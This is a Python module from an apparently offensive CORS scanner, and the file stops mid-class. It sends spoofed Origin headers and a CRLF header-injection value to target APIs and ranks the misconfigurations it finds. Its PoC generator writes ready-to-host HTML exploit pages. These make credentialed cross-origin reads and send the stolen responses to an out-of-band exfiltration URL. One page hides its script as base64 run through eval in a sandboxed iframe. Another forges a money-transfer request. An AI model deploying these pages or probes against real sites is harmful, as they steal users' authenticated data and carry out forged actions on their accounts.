# core/cors_tester.py
from __future__ import annotations

import base64
import logging
import re
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse

import requests
from requests import Response
from requests.exceptions import RequestException

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Enums
# ─────────────────────────────────────────────────────────────────────────────

class CorsVariant(Enum):
    # Reflection vulnerabilities
    REFLECT_ARBITRARY_ORIGIN     = "cors_reflect_arbitrary_origin"
    REFLECT_NULL_ORIGIN           = "cors_reflect_null_origin"
    REFLECT_REGEX_ESCAPE          = "cors_reflect_regex_escape"
    REFLECT_PREFIX_MATCH          = "cors_reflect_prefix_match"
    REFLECT_SUFFIX_MATCH          = "cors_reflect_suffix_match"
    REFLECT_SUBSTRING_MATCH       = "cors_reflect_substring_match"
    REFLECT_DOT_ESCAPE            = "cors_reflect_dot_as_wildcard"
    REFLECT_CASE_INSENSITIVE      = "cors_reflect_case_insensitive"

    # Trust-chain exploits
    TRUST_SUBDOMAIN_TAKEOVER      = "cors_trust_takeover_subdomain"
    TRUST_SUBDOMAIN_XSS           = "cors_trust_subdomain_xss"
    TRUST_HTTP_DOWNGRADE           = "cors_trust_http_downgrade"
    TRUST_THIRD_PARTY_ORIGIN       = "cors_trust_third_party_origin"
    TRUST_DEVELOPER_ORIGIN         = "cors_trust_developer_origin"

    # Specification bypass
    BYPASS_SCHEME_VARIATION        = "cors_bypass_scheme_variation"
    BYPASS_PORT_VARIATION          = "cors_bypass_port_variation"
    BYPASS_UNICODE_DOMAIN          = "cors_bypass_unicode_domain"
    BYPASS_DOT_PREPEND             = "cors_bypass_dot_prepend"
    BYPASS_TRAILING_DOT            = "cors_bypass_trailing_dot"
    BYPASS_XORIGINALURL            = "cors_bypass_x_original_url"

    # Preflight-specific
    PREFLIGHT_WILDCARD_METHODS     = "cors_preflight_wildcard_methods"
    PREFLIGHT_WILDCARD_HEADERS     = "cors_preflight_wildcard_headers"
    PREFLIGHT_CREDENTIALS_REFLECT  = "cors_preflight_credentials_reflect"
    PREFLIGHT_MAX_AGE_ZERO         = "cors_preflight_max_age_zero"
    PREFLIGHT_INJECTION            = "cors_preflight_header_injection"

    # Credentials combined
    CREDENTIALS_ARBITRARY          = "cors_credentials_arbitrary_origin"
    CREDENTIALS_NULL               = "cors_credentials_null"
    CREDENTIALS_SUBDOMAIN          = "cors_credentials_subdomain"


class FindingSeverity(Enum):
    CRITICAL = 10
    HIGH     = 7
    MEDIUM   = 5
    LOW      = 3
    INFO     = 1


class FindingStatus(Enum):
    CONFIRMED  = auto()
    LIKELY     = auto()
    POSSIBLE   = auto()
    NOT_VULN   = auto()


# ─────────────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class CorsHeaders:
    """Parsed CORS response headers for one probe."""
    acao:  Optional[str]  # Access-Control-Allow-Origin
    acac:  Optional[str]  # Access-Control-Allow-Credentials
    acam:  Optional[str]  # Access-Control-Allow-Methods
    acah:  Optional[str]  # Access-Control-Allow-Headers
    acma:  Optional[str]  # Access-Control-Max-Age
    aceh:  Optional[str]  # Access-Control-Expose-Headers
    vary:  Optional[str]  # Vary (should include Origin)
    raw:   Dict[str, str]

    @classmethod
    def from_response(cls, resp: Response) -> "CorsHeaders":
        hdrs = {k.lower(): v for k, v in resp.headers.items()}
        return cls(
            acao = hdrs.get("access-control-allow-origin"),
            acac = hdrs.get("access-control-allow-credentials"),
            acam = hdrs.get("access-control-allow-methods"),
            acah = hdrs.get("access-control-allow-headers"),
            acma = hdrs.get("access-control-max-age"),
            aceh = hdrs.get("access-control-expose-headers"),
            vary = hdrs.get("vary"),
            raw  = {k: v for k, v in resp.headers.items()
                    if k.lower().startswith("access-control")
                    or k.lower() == "vary"},
        )

    @property
    def reflects_origin(self) -> bool:
        return bool(self.acao and self.acao not in ("*", "null", ""))

    @property
    def credentials_true(self) -> bool:
        return self.acac is not None and self.acac.lower() == "true"

    @property
    def any_cors(self) -> bool:
        return bool(self.acao or self.acam or self.acah)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "acao":             self.acao,
            "acac":             self.acac,
            "acam":             self.acam,
            "acah":             self.acah,
            "acma":             self.acma,
            "aceh":             self.aceh,
            "vary":             self.vary,
            "reflects_origin":  self.reflects_origin,
            "credentials_true": self.credentials_true,
        }


@dataclass
class CorsFinding:
    finding_id:    str
    variant:       CorsVariant
    severity:      FindingSeverity
    status:        FindingStatus
    target_url:    str
    origin_sent:   str
    cors_headers:  CorsHeaders
    evidence:      Dict[str, Any]
    poc_html:      str            # ready-to-host exploit PoC
    attack_steps:  List[str]
    exploitation:  Dict[str, Any]
    notes:         str
    timestamp:     datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id":   self.finding_id,
            "variant":      self.variant.value,
            "severity":     self.severity.name,
            "status":       self.status.name,
            "target_url":   self.target_url,
            "origin_sent":  self.origin_sent,
            "cors_headers": self.cors_headers.to_dict(),
            "evidence":     self.evidence,
            "poc_html":     self.poc_html,
            "attack_steps": self.attack_steps,
            "exploitation": self.exploitation,
            "notes":        self.notes,
            "timestamp":    self.timestamp.isoformat(),
        }


@dataclass
class CorsTestResult:
    run_id:              str
    domain:              str
    endpoints_tested:    int
    findings:            List[Dict[str, Any]]
    credentialed_leaks:  int
    pocs_generated:      int
    score:               float
    risk_level:          str
    techniques_tested:   List[str]
    recommendations:     List[str]
    started_at:          datetime
    finished_at:         datetime

    def to_dict(self) -> Dict[str, Any]:
        return {
            "run_id":              self.run_id,
            "domain":              self.domain,
            "endpoints_tested":    self.endpoints_tested,
            "findings":            self.findings,
            "credentialed_leaks":  self.credentialed_leaks,
            "pocs_generated":      self.pocs_generated,
            "score":               round(self.score, 2),
            "risk_level":          self.risk_level,
            "techniques_tested":   self.techniques_tested,
            "recommendations":     self.recommendations,
            "started_at":          self.started_at.isoformat(),
            "finished_at":         self.finished_at.isoformat(),
            "duration_s":          round(
                (self.finished_at - self.started_at).total_seconds(), 3
            ),
        }


# ─────────────────────────────────────────────────────────────────────────────
# HTTP pool
# ─────────────────────────────────────────────────────────────────────────────

class _HttpPool:
    _UA = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )

    def __init__(self, timeout: float = 9.0, verify_tls: bool = False,
                 delay: float = 0.3):
        self._timeout = timeout
        self._verify  = verify_tls
        self._delay   = delay
        self._local   = threading.local()
        self._last    = threading.local()

    def _sess(self) -> requests.Session:
        if not hasattr(self._local, "s"):
            s = requests.Session()
            s.headers["User-Agent"] = self._UA
            s.verify       = self._verify
            s.max_redirects = 3
            self._local.s  = s
        return self._local.s

    def _throttle(self) -> None:
        last = getattr(self._last, "ts", 0.0)
        gap  = time.time() - last
        if gap < self._delay:
            time.sleep(self._delay - gap)
        self._last.ts = time.time()

    def get(
        self,
        url:     str,
        origin:  str,
        method:  str = "GET",
        extra_headers: Optional[Dict[str, str]] = None,
    ) -> Optional[Tuple[Response, CorsHeaders]]:
        self._throttle()
        hdrs = {"Origin": origin, **(extra_headers or {})}
        try:
            resp = self._sess().request(
                method.upper(), url,
                headers=hdrs, timeout=self._timeout,
                allow_redirects=True, verify=self._verify,
            )
            return resp, CorsHeaders.from_response(resp)
        except RequestException as e:
            logger.debug("get %s origin=%s: %s", url, origin, e)
            return None

    def options(
        self,
        url:              str,
        origin:           str,
        request_method:   str = "GET",
        request_headers:  Optional[str] = None,
        extra_headers:    Optional[Dict[str, str]] = None,
    ) -> Optional[Tuple[Response, CorsHeaders]]:
        """Send CORS preflight OPTIONS request."""
        self._throttle()
        hdrs = {
            "Origin":                         origin,
            "Access-Control-Request-Method":  request_method,
        }
        if request_headers:
            hdrs["Access-Control-Request-Headers"] = request_headers
        hdrs.update(extra_headers or {})
        try:
            resp = self._sess().options(
                url, headers=hdrs, timeout=self._timeout,
                allow_redirects=False, verify=self._verify,
            )
            return resp, CorsHeaders.from_response(resp)
        except RequestException as e:
            logger.debug("options %s origin=%s: %s", url, origin, e)
            return None

    def reset(self) -> None:
        if hasattr(self._local, "s"):
            self._local.s.close()
            del self._local.s


# ─────────────────────────────────────────────────────────────────────────────
# Origin generator — builds test origin set for one target domain
# ─────────────────────────────────────────────────────────────────────────────

class _OriginGenerator:
    """
    Generates the full set of origin probe variants for a given target URL.
    Groups:
      A. Reflection probes — arbitrary, null, case variation, scheme change
      B. Regex/suffix bypass probes — prefix match, suffix match, dot escape
      C. Trust-chain probes — known subdomains, developer origins, third-party
      D. Specification edge cases — trailing dot, unicode, port variation
    """

    # Developer / staging origins commonly whitelisted
    _DEV_ORIGINS: List[str] = [
        "https://localhost",
        "http://localhost",
        "https://localhost:3000",
        "https://localhost:8080",
        "http://127.0.0.1",
        "https://127.0.0.1",
        "http://0.0.0.0",
        "https://staging.{domain}",
        "https://dev.{domain}",
        "https://test.{domain}",
        "https://preview.{domain}",
        "https://sandbox.{domain}",
        "https://local.{domain}",
    ]

    # Origins that target the trust-chain (attacker controls these)
    _ATTACKER_BASE = "https://attacker.com"

    def generate(
        self,
        target_url:  str,
        subdomains:  List[str],
    ) -> List[Tuple[str, CorsVariant, str]]:
        """
        Returns list of (origin_to_send, variant, description).
        """
        parsed = urlparse(target_url)
        domain = parsed.netloc      # e.g. "api.example.com"
        scheme = parsed.scheme      # https
        reg_dom = self._registered_domain(domain)  # e.g. "example.com"
        
        probes: List[Tuple[str, CorsVariant, str]] = []
        
        # ── A: Reflection probes ──────────────────────────────────────────────
        
        # 1. Arbitrary attacker origin
        probes.append((
            self._ATTACKER_BASE,
            CorsVariant.REFLECT_ARBITRARY_ORIGIN,
            "arbitrary attacker origin",
        ))
        
        # 2. Null origin
        probes.append((
            "null",
            CorsVariant.REFLECT_NULL_ORIGIN,
            "null origin (sandboxed iframe / data: URI)",
        ))

        # 3. Case variation (some implementations are case-insensitive)
        probes.append((
            f"{scheme}://{domain.upper()}",
            CorsVariant.REFLECT_CASE_INSENSITIVE,
            "uppercase domain — case-insensitive whitelist",
        ))
        probes.append((
            f"{scheme}://{domain.swapcase()}",
            CorsVariant.REFLECT_CASE_INSENSITIVE,
            "swapcase domain",
        ))

        # 4. Scheme downgrade
        probes.append((
            f"http://{domain}",
            CorsVariant.TRUST_HTTP_DOWNGRADE,
            "http:// scheme downgrade",
        ))

        # ── B: Regex/pattern bypass probes ───────────────────────────────────

        # 5. Prefix match — domain is suffix of attacker origin
        # e.g. allowlist: "example.com" → attacker uses "notexample.com"
        probes.append((
            f"{scheme}://not{domain}",
            CorsVariant.REFLECT_PREFIX_MATCH,
            "prefix extension: notexample.com matches *example.com",
        ))
        probes.append((
            f"{scheme}://evil{reg_dom}",
            CorsVariant.REFLECT_PREFIX_MATCH,
            "prepend domain: evilexample.com",
        ))

        # 6. Suffix match — attacker domain ends with target domain
        # e.g. allowlist checks ends_with("example.com") → attacker.example.com.evil.com
        probes.append((
            f"{scheme}://{self._ATTACKER_BASE.split('//')[1]}.{domain}",
            CorsVariant.REFLECT_SUFFIX_MATCH,
            "subdomain of attacker wrapping domain",
        ))
        probes.append((
            f"{scheme}://{reg_dom}.attacker.com",
            CorsVariant.REFLECT_SUFFIX_MATCH,
            "domain as subdomain of attacker.com",
        ))

        # 7. Dot escape — regex treats dot as any char
        # e.g. allowlist regex: example\.com / example.com (unescaped)
        escaped_dom = domain.replace(".", "X")
        probes.append((
            f"{scheme}://{escaped_dom}",
            CorsVariant.REFLECT_DOT_ESCAPE,
            "dot-as-wildcard: replace . with X in domain",
        ))
        # Also try with 0 (digit) which may match unescaped dot
        escaped_dom_zero = domain.replace(".", "0")
        probes.append((
            f"{scheme}://{escaped_dom_zero}",
            CorsVariant.REFLECT_DOT_ESCAPE,
            "dot-as-wildcard: replace . with 0",
        ))

        # 8. Substring match
        # allowlist checks "example" in origin → matches "notexample"
        probes.append((
            f"{scheme}://evil-{reg_dom}.com",
            CorsVariant.REFLECT_SUBSTRING_MATCH,
            "substring injection: evil-example.com contains 'example'",
        ))

        # 9. Regex special characters in origin
        probes.append((
            f"{scheme}://{reg_dom}%60.attacker.com",  # backtick
            CorsVariant.REFLECT_REGEX_ESCAPE,
            "URL-encoded regex special char in origin",
        ))
        probes.append((
            f"{scheme}://{reg_dom}-.attacker.com",
            CorsVariant.REFLECT_REGEX_ESCAPE,
            "dash-dot confusion in regex",
        ))

        # ── C: Specification edge cases ───────────────────────────────────────

        # 10. Trailing dot (FQDN with dot — some parsers strip it, others don't)
        probes.append((
            f"{scheme}://{domain}.",
            CorsVariant.BYPASS_TRAILING_DOT,
            "FQDN trailing dot",
        ))
        probes.append((
            f"{scheme}://{reg_dom}.",
            CorsVariant.BYPASS_TRAILING_DOT,
            "FQDN trailing dot on registered domain",
        ))

        # 11. Port variation
        for port in [80, 443, 8080, 8443, 3000, 4000, 5000]:
            probes.append((
                f"{scheme}://{domain}:{port}",
                CorsVariant.BYPASS_PORT_VARIATION,
                f"non-standard port :{port}",
            ))

        # 12. Unicode domain (Punycode / homograph)
        # Replace 'a' with similar Unicode char U+0430 (Cyrillic а)
        if "a" in domain:
            uni_dom = domain.replace("a", "\u0430", 1)
            probes.append((
                f"{scheme}://{uni_dom}",
                CorsVariant.BYPASS_UNICODE_DOMAIN,
                "Unicode homograph domain (Cyrillic а)",
            ))

        # 13. Dot-prepend (extra leading dot)
        probes.append((
            f"{scheme}://.{domain}",
            CorsVariant.BYPASS_DOT_PREPEND,
            "leading dot before domain",
        ))

        # ── D: Subdomain trust probes ─────────────────────────────────────────

        # 14. Each discovered subdomain of target
        for sub in subdomains[:20]:
            if sub != domain:
                probes.append((
                    f"https://{sub}",
                    CorsVariant.TRUST_SUBDOMAIN_XSS,
                    f"trusted subdomain: {sub}",
                ))
                probes.append((
                    f"http://{sub}",
                    CorsVariant.TRUST_HTTP_DOWNGRADE,
                    f"http:// downgrade of subdomain: {sub}",
                ))

        # 15. Developer/staging origins
        for tmpl in self._DEV_ORIGINS:
            origin = tmpl.replace("{domain}", reg_dom)
            probes.append((
                origin,
                CorsVariant.TRUST_DEVELOPER_ORIGIN,
                f"developer/staging origin: {origin}",
            ))

        # 16. Third-party origins — common CDN / analytics that may be trusted
        for third_party in [
            "https://cdn.jsdelivr.net",
            "https://unpkg.com",
            "https://cdnjs.cloudflare.com",
            "https://ajax.googleapis.com",
            "https://stackpath.bootstrapcdn.com",
        ]:
            probes.append((
                third_party,
                CorsVariant.TRUST_THIRD_PARTY_ORIGIN,
                f"third-party CDN origin: {third_party}",
            ))

        return probes

    @staticmethod
    def _registered_domain(netloc: str) -> str:
        """Return the last two labels of a hostname (best-effort)."""
        parts = netloc.split(":")[ 0].split(".")
        if len(parts) >= 2:
            return ".".join(parts[-2:])
        return netloc


# ─────────────────────────────────────────────────────────────────────────────
# CORS response evaluator
# ─────────────────────────────────────────────────────────────────────────────

class _ResponseEvaluator:
    """
    Decides whether a CORS response constitutes a vulnerability.
    Returns (is_vuln, severity, notes) for each probe result.
    """
    
    def evaluate(
        self,
        origin_sent:  str,
        cors:         CorsHeaders,
        variant:      CorsVariant,
        resp_body:    str,
    ) -> Optional[Tuple[FindingSeverity, FindingStatus, str]]:
        if not cors.any_cors:
            return None

        acao = (cors.acao or "").strip()
        acac = (cors.acac or "").lower().strip()

        # ── Case 1: reflected arbitrary origin + credentials ──────────────────
        if (cors.reflects_origin and acac == "true"
                and acao == origin_sent):
            return (
                FindingSeverity.CRITICAL,
                FindingStatus.CONFIRMED,
                f"ACAO reflects {origin_sent!r} with credentials=true — "
                f"full cross-origin credentialed read",
            )

        # ── Case 2: reflected arbitrary origin without credentials ────────────
        if cors.reflects_origin and acao == origin_sent and acac != "true":
            sev = (FindingSeverity.HIGH if "attacker" in origin_sent.lower()
                   or "evil" in origin_sent.lower()
                   else FindingSeverity.MEDIUM)
            return (
                sev,
                FindingStatus.CONFIRMED,
                f"ACAO reflects {origin_sent!r} — no credentials but response "
                f"body may contain sensitive data",
            )

        # ── Case 3: null origin reflected ────────────────────────────────────
        if origin_sent == "null" and acao == "null":
            if acac == "true":
                return (
                    FindingSeverity.CRITICAL,
                    FindingStatus.CONFIRMED,
                    "null origin + credentials=true — exploitable from "
                    "sandboxed iframe or file:// context",
                )
            return (
                FindingSeverity.HIGH,
                FindingStatus.CONFIRMED,
                "null origin reflected — iframe-based cross-origin read possible",
            )

        # ── Case 4: wildcard + credentials (spec violation — some proxies allow)
        if acao == "*" and acac == "true":
            return (
                FindingSeverity.CRITICAL,
                FindingStatus.CONFIRMED,
                "ACAO: * combined with credentials=true — misconfigured proxy "
                "may forward credentialed cross-origin requests",
            )

        # ── Case 5: regex / pattern bypass — acao differs from sent origin
        # but attacker origin is reflected (suffix/prefix match exploit)
        if cors.reflects_origin and acao != origin_sent and acao not in ("*", "null"):
            # Server reflected a different value — may have stripped part of origin
            # or we matched an unexpected rule
            return (
                FindingSeverity.HIGH,
                FindingStatus.LIKELY,
                f"Unexpected ACAO={acao!r} for Origin={origin_sent!r} — "
                f"regex or partial-match whitelist may be exploitable",
            )

        # ── Case 6: http:// downgrade reflected ──────────────────────────────
        if (origin_sent.startswith("http://")
                and cors.reflects_origin and acao == origin_sent):
            sev = (FindingSeverity.HIGH if acac == "true"
                   else FindingSeverity.MEDIUM)
            return (
                sev,
                FindingStatus.CONFIRMED,
                f"http:// origin accepted — MITM can serve attacker origin "
                f"over HTTP and steal responses {'with credentials' if acac == 'true' else ''}",
            )

        # ── Case 7: subdomain trusted + credentials ───────────────────────────
        if (variant in (CorsVariant.TRUST_SUBDOMAIN_XSS,
                        CorsVariant.CREDENTIALS_SUBDOMAIN)
                and cors.reflects_origin and acac == "true"):
            return (
                FindingSeverity.HIGH,
                FindingStatus.CONFIRMED,
                f"Subdomain {origin_sent!r} trusted with credentials — "
                f"XSS on any subdomain leads to full data theft from main origin",
            )

        # ── Case 8: developer origin accepted in production ───────────────────
        if (variant == CorsVariant.TRUST_DEVELOPER_ORIGIN
                and cors.reflects_origin and acao == origin_sent):
            sev = (FindingSeverity.HIGH if acac == "true"
                   else FindingSeverity.MEDIUM)
            return (
                sev,
                FindingStatus.CONFIRMED,
                f"Developer origin {origin_sent!r} whitelisted in production — "
                f"anyone who can access or spoof that origin can read responses",
            )

        # ── Case 9: third-party CDN trusted with credentials ──────────────────
        if (variant == CorsVariant.TRUST_THIRD_PARTY_ORIGIN
                and cors.reflects_origin and acac == "true"):
            return (
                FindingSeverity.CRITICAL,
                FindingStatus.CONFIRMED,
                f"Third-party CDN {origin_sent!r} trusted with credentials — "
                f"CDN compromise gives full credentialed access",
            )

        return None


# ─────────────────────────────────────────────────────────────────────────────
# Preflight analyser
# ─────────────────────────────────────────────────────────────────────────────

class _PreflightAnalyser:
    """
    Sends OPTIONS preflight requests and analyses:
    - Wildcard methods/headers in preflight response
    - Credentials reflected in preflight
    - Max-Age=0 (no caching — indicates dynamic RL logic)
    - Header injection via ACRH
    - Dangerous method acceptance (PUT, DELETE, PATCH without restriction)
    """

    _DANGEROUS_METHODS: List[str] = ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT"]
    _SENSITIVE_HEADERS: List[str] = [
        "Authorization", "Cookie", "X-Auth-Token",
        "X-API-Key", "X-CSRF-Token",
    ]
    
    def analyse(
        self,
        http: _HttpPool,
        url:  str,
        origin: str,
    ) -> List[Tuple[CorsVariant, FindingSeverity, FindingStatus,
                    CorsHeaders, str]]:
        """
        Returns list of (variant, severity, status, cors_headers, notes).
        """
        findings: List[Tuple[CorsVariant, FindingSeverity, FindingStatus,
                              CorsHeaders, str]] = []

        # ── Probe 1: preflight with dangerous method ──────────────────────────
        for method in self._DANGEROUS_METHODS:
            result = http.options(url, origin, request_method=method)
            if not result:
                continue
            resp, cors = result

            if cors.acam and method in cors.acam.upper():
                sev = (FindingSeverity.HIGH if cors.credentials_true
                       else FindingSeverity.MEDIUM)
                notes = (f"Preflight allows {method} — "
                         f"{'with credentials' if cors.credentials_true else 'no credentials'}")
                if cors.credentials_true:
                    findings.append((
                        CorsVariant.PREFLIGHT_CREDENTIALS_REFLECT,
                        sev, FindingStatus.CONFIRMED, cors, notes,
                    ))
                else:
                    findings.append((
                        CorsVariant.PREFLIGHT_WILDCARD_METHODS,
                        sev, FindingStatus.CONFIRMED, cors, notes,
                    ))

        # ── Probe 2: preflight with sensitive headers ─────────────────────────
        for hdr in self._SENSITIVE_HEADERS:
            result = http.options(
                url, origin, request_method="GET",
                request_headers=hdr,
            )
            if not result:
                continue
            resp, cors = result
            if cors.acah and (hdr.lower() in cors.acah.lower() or "*" in cors.acah):
                notes = f"Preflight allows sensitive header {hdr!r}"
                sev   = (FindingSeverity.HIGH if cors.credentials_true
                         else FindingSeverity.MEDIUM)
                findings.append((
                    CorsVariant.PREFLIGHT_WILDCARD_HEADERS,
                    sev,
                    FindingStatus.CONFIRMED,
                    cors,
                    notes,
                ))

        # ── Probe 3: Max-Age=0 ────────────────────────────────────────────────
        result = http.options(url, origin, request_method="GET")
        if result:
            resp, cors = result
            if cors.acma is not None:
                try:
                    if int(cors.acma) == 0:
                        findings.append((
                            CorsVariant.PREFLIGHT_MAX_AGE_ZERO,
                            FindingSeverity.LOW,
                            FindingStatus.CONFIRMED,
                            cors,
                            "Max-Age=0 disables preflight caching — "
                            "every cross-origin request triggers a preflight",
                        ))
                except ValueError:
                    pass

        # ── Probe 4: ACRH header injection attempt ────────────────────────────
        inject_header = "Authorization\r\nX-Injected: artex_inject"
        result = http.options(
            url, origin, request_method="GET",
            request_headers=inject_header,
        )
        if result:
            resp, cors = result
            if "artex_inject" in resp.text or "artex_inject" in str(resp.headers):
                findings.append((
                    CorsVariant.PREFLIGHT_INJECTION,
                    FindingSeverity.HIGH,
                    FindingStatus.CONFIRMED,
                    cors,
                    "ACRH CRLF injection — extra header reflected in preflight response",
                ))

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# Trust-chain analyser
# ─────────────────────────────────────────────────────────────────────────────

class _TrustChainAnalyser:
    """
    For each subdomain in the trusted-origin set, checks:
    1. Is the subdomain listed as potentially takeover-able
       (from scan_results['takeover_analysis'])?
    2. Does the subdomain serve a known web app with XSS surface?
    3. Is it HTTP-only (downgrade possible)?

    Generates compound findings: "trust domain X is vulnerable to takeover/XSS
    AND main API trusts X with credentials → full data theft chain."
    """

    def analyse(
        self,
        trusted_origins:  List[str],           # origins that ACAO reflects
        scan_results:     Dict[str, Any],
        target_url:       str,
    ) -> List[Tuple[CorsVariant, FindingSeverity, str, str]]:
        """Returns (variant, severity, origin, chain_description)."""
        findings: List[Tuple[CorsVariant, FindingSeverity, str, str]] = []

        # Vulnerable subdomains from takeover_analysis
        takeover_subs: Set[str] = set()
        ta = scan_results.get("takeover_analysis", {})
        for sub in ta.get("vulnerable_subdomains", []):
            if isinstance(sub, dict):
                takeover_subs.add(sub.get("subdomain", ""))
            else:
                takeover_subs.add(str(sub))

        # XSS-confirmed subdomains from vuln_scan
        xss_subs: Set[str] = set()
        vs = scan_results.get("vuln_scan", {})
        for f in vs.get("findings", []):
            if "xss" in f.get("vuln_class", ""):
                parsed = urlparse(f.get("target_url", ""))
                xss_subs.add(parsed.netloc)

        for origin in trusted_origins:
            parsed   = urlparse(origin)
            hostname = parsed.netloc.split(":")[0]

            # Takeover chain
            if hostname in takeover_subs:
                findings.append((
                    CorsVariant.TRUST_SUBDOMAIN_TAKEOVER,
                    FindingSeverity.CRITICAL,
                    origin,
                    f"CORS trusts {origin!r} AND {hostname} is vulnerable to "
                    f"subdomain takeover — claim the subdomain, serve attacker "
                    f"content, steal credentialed responses from main API",
                ))

            # XSS chain
            if hostname in xss_subs:
                findings.append((
                    CorsVariant.TRUST_SUBDOMAIN_XSS,
                    FindingSeverity.CRITICAL,
                    origin,
                    f"CORS trusts {origin!r} AND {hostname} has confirmed XSS — "
                    f"XSS payload sends credentialed cross-origin request to main API",
                ))

            # HTTP downgrade chain
            if origin.startswith("http://"):
                findings.append((
                    CorsVariant.TRUST_HTTP_DOWNGRADE,
                    FindingSeverity.HIGH,
                    origin,
                    f"CORS trusts plain-HTTP origin {origin!r} — MITM on "
                    f"victim's network can serve attacker page from that origin",
                ))

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# PoC generator — produces ready-to-host HTML exploit pages
# ─────────────────────────────────────────────────────────────────────────────

class _PocGenerator:
    """
    Generates fully self-contained HTML exploit PoC pages for each
    confirmed CORS finding.  Pages use fetch() with credentials
    where applicable and exfiltrate response data to an OOB endpoint.
    """

    def _exfil_url(self) -> str:
        return "https://artex-oob.internal/cors-exfil"

    def credentialed_read(
        self,
        target_url:  str,
        origin:      str,
        exfil_url:   Optional[str] = None,
    ) -> str:
        exfil = exfil_url or self._exfil_url()
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS PoC — Credentialed Read</title></head>
<body>
<h2>CORS Credentialed Data Theft PoC</h2>
<p>Target: <code>{target_url}</code></p>
<p>Exploiting from origin: <code>{origin}</code></p>
<pre id="output">Fetching...</pre>
<script>
// CORS credentialed cross-origin read
// Host this page at: {origin}
// Then visit this page — the browser will send cookies/auth headers
// for {target_url} in the cross-origin request.

(async function() {{
  try {{
    const resp = await fetch('{target_url}', {{
      method: 'GET',
      credentials: 'include',
      headers: {{ 'Content-Type': 'application/json' }}
    }});
    const body = await resp.text();
    document.getElementById('output').textContent = body;
    // Exfiltrate to attacker server
    await fetch('{exfil}', {{
      method: 'POST',
      body: JSON.stringify({{
        url: '{target_url}',
        status: resp.status,
        data: body.substring(0, 4096)
      }}),
      mode: 'no-cors'
    }});
  }} catch(e) {{
    document.getElementById('output').textContent = 'Error: ' + e;
  }}
}})();
</script>
</body>
</html>"""

    def null_origin_iframe(
        self,
        target_url: str,
        exfil_url:  Optional[str] = None,
    ) -> str:
        exfil = exfil_url or self._exfil_url()
        # Base64-encode the inner script to embed in srcdoc
        inner_script = f"""
fetch('{target_url}', {{credentials:'include'}})
  .then(r=>r.text())
  .then(d=>{{
    fetch('{exfil}',{{
      method:'POST',
      body:JSON.stringify({{data:d.substring(0,4096)}}),
      mode:'no-cors'
    }});
    top.document.getElementById('cors_out').textContent=d;
  }});
""".strip()
        encoded = base64.b64encode(inner_script.encode()).decode()
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS null-origin PoC</title></head>
<body>
<h2>CORS null Origin Exploit PoC</h2>
<p>Target: <code>{target_url}</code></p>
<p>The sandboxed iframe sends Origin: null — trusted by the target server.</p>
<pre id="cors_out">Waiting...</pre>
<!-- Sandboxed iframe sends Origin: null per spec -->
<iframe id="f" sandbox="allow-scripts allow-top-navigation-by-user-activation"
  srcdoc="<script>eval(atob('{encoded}'))<\/script>"
  style="display:none"></iframe>
</body>
</html>"""

    def csrf_state_change(
        self,
        target_url:  str,
        method:      str = "POST",
        body_params: Optional[str] = None,
        exfil_url:   Optional[str] = None,
    ) -> str:
        body = body_params or '{"action":"transfer","amount":9999,"to":"attacker"}'
        exfil = exfil_url or self._exfil_url()
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS CSRF State-Change PoC</title></head>
<body>
<h2>CORS CSRF — State-Change via Cross-Origin Request</h2>
<p>Sending credentialed {method} to <code>{target_url}</code></p>
<pre id="output">Sending...</pre>
<script>
(async function() {{
  try {{
    const resp = await fetch('{target_url}', {{
      method: '{method}',
      credentials: 'include',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({body})
    }});
    const data = await resp.text();
    document.getElementById('output').textContent =
      'Status: ' + resp.status + '\\nBody: ' + data.substring(0,500);
    await fetch('{exfil}', {{
      method:'POST',
      body: JSON.stringify({{status: resp.status, data: data.substring(0,2000)}}),
      mode: 'no-cors'
    }});
  }} catch(e) {{
    document.getElementById('output').textContent = 'Error: ' + e;
  }}
}})();
</script>
</body>
</html>"""

    def preflight_bypass(
        self,
        target_url:  str,
        origin:      str,
        method:      str = "DELETE",
        exfil_url:   Optional[str] = None,
    ) -> str:
        exfil = exfil_url or self._exfil_url()
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS Preflight Bypass PoC</title></head>
<body>
<h2>CORS Preflight — {method} allowed cross-origin</h2>
<pre id="output">Sending preflight + {method}...</pre>
<script>
(async function() {{
  try {{
    const resp = await fetch('{target_url}', {{
      method: '{method}',
      credentials: 'include',
      headers: {{'Content-Type': 'application/json', 'X-Custom-Header': 'test'}}
    }});
    const data = await resp.text();
    document.getElementById('output').textContent =
      'Status: ' + resp.status + ' Body: ' + data.substring(0,500);
    await fetch('{exfil}', {{
      method:'POST',
      body: JSON.stringify({{method:'{method}', status:resp.status, data}}),
      mode:'no-cors'
    }});
  }} catch(e) {{
    document.getElementById('output').textContent = 'Error: ' + e;
  }}
}})();
</script>
</body>
</html>"""

    def choose_poc(
        self,
        variant:    CorsVariant,
        target_url: str,
        origin:     str,
    ) -> str:
        if variant == CorsVariant.REFLECT_NULL_ORIGIN:
            return self.null_origin_iframe(target_url)
        if variant in (CorsVariant.PREFLIGHT_WILDCARD_METHODS,
                       CorsVariant.PREFLIGHT_CREDENTIALS_REFLECT):
            return self.preflight_bypass(target_url, origin)
        if variant in (CorsVariant.CREDENTIALS_ARBITRARY,
                       CorsVariant.CREDENTIALS_NULL,
                       CorsVariant.CREDENTIALS_SUBDOMAIN,
                       CorsVariant.REFLECT_ARBITRARY_ORIGIN):
            return self.credentialed_read(target_url, origin)
        return self.credentialed_read(target_url, origin)


# ─────────────────────────────────────────────────────────────────────────────
# Endpoint discoverer
# ─────────────────────────────────────────────────────────────────────────────

class _EndpointDiscoverer:
    """
